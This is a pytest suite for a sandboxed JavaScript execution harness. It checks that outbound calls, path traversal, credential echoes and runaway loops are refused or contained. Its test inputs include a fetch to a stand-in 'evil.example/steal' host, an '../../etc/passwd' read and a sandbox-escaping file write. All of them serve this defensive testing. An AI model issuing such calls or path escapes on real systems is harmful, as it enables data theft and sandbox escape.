"""
Sandboxed code-mode execution tests (spec code-mode-execution, C1/C3).

Covers ``core/code_execution`` (the harness) + ``core/code_runner.mjs``
(the trusted vm-context runner):

  * happy path: console + scoped sandboxFs + sandbox_env-only credential path
  * egress refusal: page ops / fetch outside declared targets fail closed
  * filesystem escape refusal: sandboxFs paths outside the run sandbox dir
  * credential non-leakage canary: echoed secrets are scrubbed; the spec file
    never carries values; host env never reaches the child
  * timeout kill: an unbounded loop dies at the wall-clock cap
  * envelope containment: the envelope is a fixed shape; ``require`` and other
    host surfaces simply do not exist inside the context
  * harness second line of defense: nested-code-mode patterns refuse pre-spawn
"""

import json
import os
import sys
from pathlib import Path

import pytest

DOMAIN_CORE_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(DOMAIN_CORE_ROOT / "gateway"))
sys.path.insert(0, str(DOMAIN_CORE_ROOT))

_existing_core = sys.modules.get("core")
if _existing_core is not None:
    _existing_file = getattr(_existing_core, "__file__", "") or ""
    if Path(_existing_file).parent != DOMAIN_CORE_ROOT / "core":
        for _name in [
            m for m in list(sys.modules)
            if (m == "core" or m.startswith("core.")) and not m.startswith("core.tests")
        ]:
            del sys.modules[_name]

from core.code_execution import (  # noqa: E402
    CodeExecutionRefused,
    CodeExecutionRequest,
    envelope_ok,
    execute_code,
)

pytestmark = pytest.mark.asyncio

TARGET = "http://127.0.0.1:8080"


def _req(code, **kwargs):
    kwargs.setdefault("declared_targets", [TARGET])
    return CodeExecutionRequest(code=code, **kwargs)


# ── Happy path ───────────────────────────────────────────────────────────────

async def test_happy_path_runs_in_sandbox_with_scoped_handles():
    envelope = await execute_code(_req(
        "console.log('hello from code mode');\n"
        "await sandboxFs.writeFile('out/result.txt', 'ok');\n"
        "console.log('user=' + process.env.CODE_USER);",
        sandbox_env={"CODE_USER": "svc-account"},
    ))
    assert envelope_ok(envelope), envelope
    assert "hello from code mode" in envelope["stdout"]
    # The echoed credential value must be scrubbed — seeing *** IS the pass.
    assert "svc-account" not in envelope["stdout"]
    assert "user=***" in envelope["stdout"]
    assert envelope["exit_status"] == 0
    assert envelope["timed_out"] is False


async def test_sandbox_fs_is_scoped_to_the_run_dir(tmp_path):
    sandbox = str(tmp_path / "run-sandbox")
    os.makedirs(sandbox)
    envelope = await execute_code(_req(
        "await sandboxFs.writeFile('a/b.txt', 'data');\n"
        "console.log((await sandboxFs.readdir('.')).join(','));",
        run_sandbox_dir=sandbox,
    ))
    assert envelope_ok(envelope), envelope
    assert (tmp_path / "run-sandbox" / "a" / "b.txt").read_text() == "data"
    assert "a" in envelope["stdout"]


async def test_page_bridge_receives_ops_for_declared_targets():
    ops = []

    async def bridge(op, args):
        ops.append((op, args))
        if op == "goto":
            return {"url": args[0]}
        return {"op": op, "done": True}

    envelope = await execute_code(_req(
        f"await page.goto('{TARGET}/login');\n"
        "await page.click('#go');\n"
        "console.log('clicked');",
        page_op_handler=bridge,
    ))
    assert envelope_ok(envelope), envelope
    assert [op for op, _ in ops] == ["goto", "click"]
    assert ops[0][1][0] == f"{TARGET}/login"


# ── Refusals ─────────────────────────────────────────────────────────────────

async def test_egress_refusal_page_goto_outside_declared_targets():
    envelope = await execute_code(_req(
        "await page.goto('https://evil.example/x');",
    ))
    assert envelope["refused"] is not None
    assert "outside the declared task targets" in envelope["refused"]
    assert envelope["exit_status"] == 13
    assert envelope_ok(envelope) is False


async def test_egress_refusal_fetch_outside_declared_targets():
    envelope = await execute_code(_req(
        "await fetch('https://evil.example/steal');",
    ))
    assert envelope["refused"] is not None
    assert "outside the declared task targets" in envelope["refused"]


async def test_filesystem_escape_refusal():
    envelope = await execute_code(_req(
        "try { await sandboxFs.readFile('../../etc/passwd'); } "
        "catch (e) { console.log('caught: ' + e.message); }",
    ))
    assert "escapes the run sandbox" in envelope["stdout"]
    # The catch is inside the payload, so the run itself completes cleanly —
    # the escape ATTEMPT was refused, which is the security property.
    assert envelope["exit_status"] == 0


async def test_filesystem_escape_uncaught_is_a_refusal_not_a_crash():
    envelope = await execute_code(_req(
        "await sandboxFs.writeFile('../../../tmp/escaped.txt', 'x');",
    ))
    assert envelope["refused"] is not None
    assert "escapes the run sandbox" in envelope["refused"]
    assert not Path("/tmp/escaped.txt").exists()


async def test_no_browser_bridge_is_an_honest_refusal():
    envelope = await execute_code(_req(
        "await page.click('#anything');",
    ))
    assert envelope["refused"] is not None
    assert "no browser bridge" in envelope["refused"]


async def test_declaring_the_host_makes_goto_grantable():
    ops = []
    envelope = await execute_code(_req(
        "await page.goto('https://task.example/page');",
        declared_targets=["https://task.example"],
        page_op_handler=lambda op, args: ops.append((op, args)) or {"ok": True},
    ))
    assert envelope_ok(envelope), envelope
    assert ops[0][1][0] == "https://task.example/page"


# ── Credential non-leakage canary ────────────────────────────────────────────

async def test_echoed_sandbox_secret_is_scrubbed_from_stdout(tmp_path):
    canary_value = "cu23-canary-not-a-real-credential"
    sandbox = str(tmp_path / "canary")
    os.makedirs(sandbox)
    envelope = await execute_code(_req(
        "console.log('token=' + process.env.CODE_TOKEN);",
        sandbox_env={"CODE_TOKEN": canary_value},
        run_sandbox_dir=sandbox,
    ))
    assert canary_value not in envelope["stdout"]
    assert "***" in envelope["stdout"]


async def test_spec_file_carries_only_key_names_not_values(tmp_path):
    canary_value = "supersecret-value-123"
    sandbox = str(tmp_path / "spec-canary")
    os.makedirs(sandbox)
    await execute_code(_req(
        "console.log('hi');",
        sandbox_env={"CODE_TOKEN": canary_value},
        run_sandbox_dir=sandbox,
    ))
    spec = json.loads(Path(sandbox, "code-spec.json").read_text())
    assert spec["sandboxEnvKeys"] == ["CODE_TOKEN"]
    assert canary_value not in Path(sandbox, "code-spec.json").read_text()


async def test_host_environment_does_not_leak_into_the_child():
    marker = "HOSTENVMARKER-zzz-4711"
    os.environ["CU23_HOST_MARKER"] = marker
    try:
        envelope = await execute_code(_req(
            "console.log('keys=' + Object.keys(process.env).sort().join(','));",
        ))
    finally:
        os.environ.pop("CU23_HOST_MARKER", None)
    assert marker not in envelope["stdout"]
    assert "CU23_HOST_MARKER" not in envelope["stdout"]
    # PATH is the only non-sandbox_env key the child ever sees.
    assert "HOME" not in envelope["stdout"]


# ── Timeout + envelope containment ───────────────────────────────────────────

async def test_unbounded_loop_is_killed_at_the_wall_clock_cap():
    envelope = await execute_code(_req(
        "while (true) { Math.random(); }",
        timeout_s=2.0,
    ))
    assert envelope["timed_out"] is True
    assert envelope["exit_status"] in (None, 0) or envelope["timed_out"]
    assert envelope_ok(envelope) is False
    assert envelope["duration_ms"] >= 2000


async def test_envelope_is_a_fixed_shape_and_host_surfaces_are_absent():
    envelope = await execute_code(_req(
        "console.log(typeof require, typeof process.cwd, typeof Buffer);\n"
        "console.log(JSON.stringify(Object.keys(process.env)));",
    ))
    assert envelope_ok(envelope), envelope
    assert "undefined undefined undefined" in envelope["stdout"]
    assert "[]" in envelope["stdout"]  # no sandbox_env declared → empty env
    # Fixed envelope fields — nothing else crosses back.
    assert set(envelope.keys()) == {
        "stdout", "stdout_truncated", "exit_status", "timed_out", "refused",
        "error", "screenshot_sha256", "screenshot_ref", "duration_ms",
        "sandbox_dir",
    }


async def test_stdout_is_truncated_to_the_cap():
    envelope = await execute_code(_req(
        "for (let i = 0; i < 500; i++) console.log('line-' + i);",
        stdout_limit=512,
    ))
    assert envelope["stdout_truncated"] is True
    assert len(envelope["stdout"].encode()) <= 512


# ── Harness second line of defense ───────────────────────────────────────────

async def test_nested_code_mode_pattern_refuses_before_spawn():
    with pytest.raises(CodeExecutionRefused) as err:
        await execute_code(_req(
            "await fetch('http://localhost:8013/aci/code', {method: 'POST'});",
        ))
    assert err.value.class_ == "destructive_call"


async def test_unexecutable_language_refuses_before_spawn():
    with pytest.raises(CodeExecutionRefused) as err:
        await execute_code(_req("print('hi')", language="pyautogui-python"))
    assert err.value.class_ == "language_not_allowed"
